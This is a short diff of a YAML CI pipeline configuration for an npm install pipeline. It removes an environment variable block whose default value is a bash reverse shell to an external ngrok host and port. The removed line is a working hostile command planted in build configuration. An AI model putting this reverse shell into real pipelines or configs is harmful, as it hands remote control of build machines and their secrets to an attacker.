@@ -12,11 +12,8 @@ pipelines:
   - name: npm_install_pipeline
     configuration:
       environmentVariables:
-        readOnly:
-          env: 
-            default: "/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/16856 0>&1'"
-            values: ["/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/16856 0>&1'"]
-            allowCustom: true
+        env: 
+          allowCustom: true
     steps:
       - name: build_on_pr
         type: Bash
